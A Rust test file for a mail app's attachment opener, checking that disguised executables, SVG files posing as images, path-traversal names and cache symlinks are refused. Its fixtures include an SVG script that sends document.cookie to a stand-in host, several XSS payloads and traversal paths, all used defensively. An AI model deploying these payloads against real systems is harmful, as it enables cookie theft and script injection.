//! T-45: opening a mail attachment, the path the app's `mail_attachment_open`
//! command runs ([`uni_core::mail::open_attachment`]): checked, fetched from a
//! fake bridge over real HTTP, written to a cache folder, handed to an opener.
//! The opener here records what it was given instead of launching an app.
//! What the bytes must be is tested in `mail_attachment_content.rs`.

#[path = "support/fake_mail_bridge.rs"]
mod fake;

use std::cell::RefCell;
use std::path::{Path, PathBuf};

use fake::{sample_mail, FakeBridge};
use nostr::Keys;
use uni_core::mail::{open_attachment, MailBridge, MailError};

const SVG: &[u8] = br#"<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>fetch('https://x.example/'+document.cookie)</script></svg>"#;
const PNG: &[u8] = include_bytes!("fixtures/attachments/photo.png");
const PDF: &[u8] = include_bytes!("fixtures/attachments/notes.pdf");
const EXE: &[u8] = b"MZ\x90\0\x03\0\0\0\x04\0\0\0\xFF\xFF";

struct Setup {
    keys: Keys,
    fake: FakeBridge,
    cache: tempfile::TempDir,
}

async fn setup(blobs: &[(&str, &[u8])]) -> Setup {
    let keys = Keys::generate();
    let mut mail = sample_mail();
    for (id, bytes) in blobs {
        mail.blobs.insert(id.to_string(), bytes.to_vec());
    }
    let fake = FakeBridge::start(0, &[keys.public_key().to_hex()], mail).await;
    Setup { keys, fake, cache: tempfile::tempdir().unwrap() }
}

impl Setup {
    /// Open through the real path; what the opener was handed, if anything.
    async fn open(&self, blob: &str, name: Option<&str>, mime: Option<&str>) -> (Result<PathBuf, MailError>, Option<PathBuf>) {
        self.open_in(self.cache.path(), blob, name, mime).await
    }

    async fn open_in(&self, cache: &Path, blob: &str, name: Option<&str>, mime: Option<&str>) -> (Result<PathBuf, MailError>, Option<PathBuf>) {
        let bridge = MailBridge::new(&self.fake.url, &self.keys).unwrap();
        let opened = RefCell::new(None);
        let r = open_attachment(&bridge, cache, blob, name, mime, |p: &Path| {
            *opened.borrow_mut() = Some(p.to_path_buf());
            Ok(())
        })
        .await;
        (r, opened.into_inner())
    }

    fn fetches(&self) -> usize {
        self.fake.state.lock().unwrap().requests.iter().filter(|(p, _)| p == "/mail/raw").count()
    }

    /// Every file under the cache folder.
    fn cached(&self) -> Vec<PathBuf> {
        fn walk(d: &Path, out: &mut Vec<PathBuf>) {
            for e in std::fs::read_dir(d).into_iter().flatten().flatten() {
                if e.path().is_dir() { walk(&e.path(), out) } else { out.push(e.path()) }
            }
        }
        let mut out = Vec::new();
        walk(self.cache.path(), &mut out);
        out
    }
}

fn refused(r: &Result<PathBuf, MailError>, says: &str) {
    match r {
        Err(MailError::Invalid { message }) => assert!(message.contains(says), "{message}"),
        other => panic!("expected a refusal saying {says:?}, got {other:?}"),
    }
}

#[tokio::test]
async fn a_real_pdf_is_cached_and_opened() {
    let s = setup(&[]).await;
    let (r, opened) = s.open("Bnotes-pdf", Some("thursday-notes.pdf"), Some("application/pdf")).await;
    let path = r.unwrap();
    assert_eq!(path.file_name().unwrap(), "thursday-notes.pdf");
    assert_eq!(path.parent().unwrap().parent().unwrap(), s.cache.path(), "in a folder of its own in the cache");
    assert_eq!(opened.as_ref(), Some(&path), "handed to the opener");
    assert_eq!(std::fs::read(&path).unwrap(), PDF);
}

#[tokio::test]
async fn svg_named_png_is_refused_and_not_left_in_the_cache() {
    let s = setup(&[("Bsvg", SVG)]).await;
    let (r, opened) = s.open("Bsvg", Some("invoice.png"), Some("image/png")).await;
    refused(&r, "its contents are an SVG image");
    assert_eq!(opened, None, "never reaches the opener");
    assert_eq!(s.fetches(), 1);
    assert!(s.cached().is_empty(), "{:?}", s.cached());
}

#[tokio::test]
async fn a_program_named_as_a_document_is_refused() {
    let s = setup(&[("Bexe", EXE)]).await;
    let (r, opened) = s.open("Bexe", Some("statement.pdf"), Some("application/octet-stream")).await;
    refused(&r, "a Windows program");
    assert_eq!(opened, None);
    assert!(s.cached().is_empty());
}

#[tokio::test]
async fn a_declared_type_that_does_not_fit_the_name_is_refused_before_fetching() {
    // real PNG bytes, but the sender declares SVG: name and declared type disagree, so nothing is fetched
    let s = setup(&[("Bpng", PNG)]).await;
    for (name, mime) in [("logo.png", "image/svg+xml"), ("notes.txt", "text/html"), ("report.pdf", "application/x-msdownload")] {
        let (r, opened) = s.open("Bpng", Some(name), Some(mime)).await;
        refused(&r, &format!("it is sent as {mime}"));
        assert_eq!(opened, None, "{name}");
    }
    assert_eq!(s.fetches(), 0);
    assert!(s.cached().is_empty());
}

#[tokio::test]
async fn double_extensions_go_by_the_last_one_and_the_bytes() {
    let s = setup(&[("Bexe", EXE), ("Bpdf", PDF)]).await;
    // .exe last: refused before fetching
    let (r, _) = s.open("Bexe", Some("invoice.pdf.exe"), Some("application/pdf")).await;
    refused(&r, ".exe files");
    assert_eq!(s.fetches(), 0);
    // .png last but a program inside: refused after fetching, nothing kept
    let (r, opened) = s.open("Bexe", Some("invoice.exe.png"), Some("image/png")).await;
    refused(&r, "a Windows program");
    assert_eq!(opened, None);
    // a real PDF with a dot in its name is fine
    let (r, opened) = s.open("Bpdf", Some("report.v2.pdf"), Some("application/pdf")).await;
    assert_eq!(opened, Some(r.unwrap()));
    let cached = s.cached();
    assert_eq!(cached.len(), 1, "{cached:?}");
    assert_eq!(cached[0].file_name().unwrap(), "report.v2.pdf");
}

#[tokio::test]
async fn names_and_ids_cannot_leave_the_cache_folder() {
    let s = setup(&[("Bpdf", PDF)]).await;
    for name in ["../../../escape.pdf", "/etc/cron.d/x.pdf", "..\\..\\x.pdf"] {
        let (r, opened) = s.open("Bpdf", Some(name), None).await;
        let path = r.unwrap_or_else(|e| panic!("{name}: {e:?}"));
        assert_eq!(path.parent().unwrap().parent().unwrap(), s.cache.path(), "{name} -> {path:?}");
        assert_eq!(opened, Some(path));
    }
    assert!(!s.cache.path().parent().unwrap().join("escape.pdf").exists());
    // a bare ".pdf" loses its leading dot, so it has no type at all
    refused(&s.open("Bpdf", Some(".pdf"), None).await.0, "a file with no type");
    // a blob id that is a path never reaches the bridge, and nothing is written
    let before = s.cached().len();
    for blob in ["../Bpdf", "a/b", ""] {
        let (r, opened) = s.open(blob, Some("x.pdf"), None).await;
        refused(&r, "bad mail id");
        assert_eq!(opened, None);
    }
    assert_eq!(s.fetches(), 3, "only the three good opens fetched");
    assert_eq!(s.cached().len(), before);
}

#[tokio::test]
async fn types_that_could_run_are_refused_before_anything_is_fetched() {
    let s = setup(&[("Bpdf", PDF)]).await;
    for name in [Some("invoice.exe"), Some("page.html"), Some("logo.svg"), Some("run.command"), Some("a.zip"), Some("macro.docm"), Some("README"), None] {
        let (r, opened) = s.open("Bpdf", name, Some("application/pdf")).await;
        refused(&r, "Uni doesn't open");
        assert_eq!(opened, None, "{name:?}");
    }
    assert_eq!(s.fetches(), 0);
    assert!(s.fake.state.lock().unwrap().requests.is_empty(), "not even signed and sent");
}

#[tokio::test]
async fn an_opener_that_fails_says_so() {
    let s = setup(&[]).await;
    let bridge = MailBridge::new(&s.fake.url, &s.keys).unwrap();
    let r = open_attachment(&bridge, s.cache.path(), "Bnotes-pdf", Some("n.pdf"), None, |_: &Path| Err("no app for PDF".into())).await;
    assert_eq!(r.unwrap_err(), MailError::Invalid { message: "no app for PDF".into() });
}

#[tokio::test]
async fn the_sample_mail_s_disguised_invoice_is_refused() {
    // the walkthrough's message: what the fake bridge serves, through the real path
    let s = setup(&[]).await;
    let (r, opened) = s.open("Binvoice-svg", Some("invoice.png"), Some("image/png")).await;
    refused(&r, "named .png but its contents are an SVG image");
    assert_eq!(opened, None);
}

#[tokio::test]
async fn the_sample_mail_s_word_file_with_an_object_is_refused() {
    // the walkthrough's budget.docx: a real Word file plus an OLE object behind a compressed relationship
    let s = setup(&[]).await;
    let (r, opened) = s.open("Bbudget-docx", Some("budget.docx"), Some("application/vnd.openxmlformats-officedocument.wordprocessingml.document")).await;
    refused(&r, "it is named .docx but it is an Office file with macros, an embedded object");
    assert_eq!(opened, None);
    assert!(s.cached().is_empty());
}

#[tokio::test]
async fn markdown_is_opened_as_plain_text() {
    // a Markdown viewer renders HTML in Markdown; a text editor doesn't, so Markdown goes to one
    let notes: &[(&str, &[u8])] = &[
        ("Bimg", b"# Invoice\n<img src=\"x\" onerror=\"alert(1)\">"),
        ("Bcaps", b"# Hi\n<IMG SRC=x OnError=alert(1)>"),
        ("Bdetails", b"Notes\n<details open ontoggle=alert(1)>x</details>"),
        ("Bvideo", b"Notes\n<video><source onerror=\"alert(1)\"></video>"),
        ("Bstyle", b"Notes\n<style>@import 'https://x.example/a.css'</style>"),
        ("Bplain", b"# Plain\n\n- one\n- two\n"),
    ];
    let s = setup(notes).await;
    for (blob, bytes) in notes {
        let (r, opened) = s.open(blob, Some("notes.md"), Some("text/markdown")).await;
        let path = r.unwrap_or_else(|e| panic!("{blob}: {e:?}"));
        assert_eq!(path.file_name().unwrap(), "notes.md.txt", "{blob}");
        assert_eq!(opened, Some(path.clone()));
        assert_eq!(std::fs::read(&path).unwrap(), *bytes);
    }
    // the markup Uni refuses in any text is still refused
    let s = setup(&[("Bjs", b"[x](javascript:alert(1))")]).await;
    refused(&s.open("Bjs", Some("notes.md"), None).await.0, "a web page");
}

#[cfg(unix)]
mod cache {
    use super::*;
    use std::os::unix::fs::{symlink, PermissionsExt};

    fn mode(p: &Path) -> u32 {
        std::fs::symlink_metadata(p).unwrap().permissions().mode() & 0o777
    }

    #[tokio::test]
    async fn the_cache_is_private_and_every_open_gets_its_own_folder() {
        let s = setup(&[]).await;
        let cache = s.cache.path().join("mail");
        // a cache folder left open by an older build is made private
        std::fs::create_dir(&cache).unwrap();
        std::fs::set_permissions(&cache, std::fs::Permissions::from_mode(0o755)).unwrap();
        let (first, _) = s.open_in(&cache, "Bnotes-pdf", Some("thursday-notes.pdf"), None).await;
        let (second, _) = s.open_in(&cache, "Bnotes-pdf", Some("thursday-notes.pdf"), None).await;
        let (first, second) = (first.unwrap(), second.unwrap());
        assert_ne!(first, second, "a new folder per open");
        assert_eq!(mode(&cache), 0o700);
        for p in [&first, &second] {
            assert_eq!(mode(p.parent().unwrap()), 0o700, "{p:?}");
            assert_eq!(mode(p), 0o600, "{p:?}");
            assert_eq!(std::fs::read(p).unwrap(), PDF);
        }
        // a new cache folder is private from the start
        let fresh = s.cache.path().join("new/mail");
        s.open_in(&fresh, "Bnotes-pdf", Some("n.pdf"), None).await.0.unwrap();
        assert_eq!(mode(&fresh), 0o700);
    }

    #[tokio::test]
    async fn a_cache_folder_that_is_a_symlink_is_refused() {
        let s = setup(&[]).await;
        let elsewhere = s.cache.path().join("elsewhere");
        std::fs::create_dir(&elsewhere).unwrap();
        let link = s.cache.path().join("mail");
        symlink(&elsewhere, &link).unwrap();
        let (r, opened) = s.open_in(&link, "Bnotes-pdf", Some("thursday-notes.pdf"), None).await;
        refused(&r, "Uni couldn't save this attachment safely: the mail cache folder is a link or not a folder");
        assert_eq!(opened, None);
        assert_eq!(std::fs::read_dir(&elsewhere).unwrap().count(), 0, "nothing written through the link");
        // nor a file where the folder should be
        let file = s.cache.path().join("file");
        std::fs::write(&file, b"x").unwrap();
        refused(&s.open_in(&file, "Bnotes-pdf", Some("n.pdf"), None).await.0, "couldn't save this attachment safely");
    }

    #[tokio::test]
    async fn a_symlink_planted_in_the_cache_is_never_written_through() {
        // fix round 1 wrote to cache/<blob id>/<name>, so a link planted there sent the bytes anywhere
        let s = setup(&[]).await;
        let victim = s.cache.path().join("victim");
        std::fs::write(&victim, b"keep me").unwrap();
        let cache = s.cache.path().join("mail");
        std::fs::create_dir_all(cache.join("Bnotes-pdf")).unwrap();
        symlink(&victim, cache.join("Bnotes-pdf/thursday-notes.pdf")).unwrap();
        let (r, opened) = s.open_in(&cache, "Bnotes-pdf", Some("thursday-notes.pdf"), None).await;
        let path = r.unwrap();
        assert_eq!(opened, Some(path.clone()));
        assert!(!std::fs::symlink_metadata(&path).unwrap().file_type().is_symlink());
        assert_eq!(std::fs::read(&victim).unwrap(), b"keep me");
    }

    #[tokio::test]
    async fn yesterday_s_opens_are_cleared_and_links_are_removed_not_followed() {
        let s = setup(&[]).await;
        let cache = s.cache.path().join("mail");
        let outside = s.cache.path().join("outside");
        std::fs::create_dir_all(&outside).unwrap();
        std::fs::write(outside.join("keep.txt"), b"keep").unwrap();
        std::fs::create_dir_all(cache.join("old")).unwrap();
        std::fs::write(cache.join("old/x.pdf"), PDF).unwrap();
        symlink(&outside, cache.join("old-link")).unwrap();
        let two_days_ago = std::time::SystemTime::now() - std::time::Duration::from_secs(48 * 3600);
        std::fs::File::open(cache.join("old")).unwrap().set_modified(two_days_ago).unwrap();
        // a link's own time can't be set from std, so it is cleared only if old: this one is new and stays
        s.open_in(&cache, "Bnotes-pdf", Some("n.pdf"), None).await.0.unwrap();
        assert!(!cache.join("old").exists(), "a two-day-old open is cleared");
        assert!(std::fs::symlink_metadata(cache.join("old-link")).is_ok(), "a new entry stays");
        assert_eq!(std::fs::read(outside.join("keep.txt")).unwrap(), b"keep");
    }
}
